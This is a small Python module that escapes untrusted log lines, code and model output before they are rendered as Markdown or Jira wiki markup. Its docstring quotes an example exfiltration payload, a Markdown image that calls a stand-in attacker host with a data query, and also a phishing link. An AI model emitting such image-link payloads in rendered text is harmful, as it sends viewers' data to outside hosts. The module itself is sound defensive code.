"""Neutralize untrusted text (log lines, code, model output) before it is rendered as Markdown or Jira wiki markup.

Logs can be attacker-controlled. Rendered as-is, a log line such as `![x](https://evil.example/?d=...)` would make a viewer's browser
fetch a remote image, and `[click](https://evil.example)` becomes a phishing link. Escaping brackets and angle brackets removes
links, images and raw HTML. Code blocks are not affected (their content is literal).
"""
from __future__ import annotations

import re

_MD = re.compile(r"([\\\[\]<>])")
_MD_UI = re.compile(r"([\\\[\]<>$])")
_WIKI = re.compile(r"([\\{}\[\]|!])")
_CTRL = re.compile(r"[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]")


def md_escape(text: str, *, ui: bool = False) -> str:
    """Escape for Markdown. `ui=True` also escapes `$` (Streamlit renders $...$ as math)."""
    text = _CTRL.sub("", str(text))
    return (_MD_UI if ui else _MD).sub(r"\\\1", text)


def wiki_escape(text: str) -> str:
    return _WIKI.sub(r"\\\1", _CTRL.sub("", str(text)))
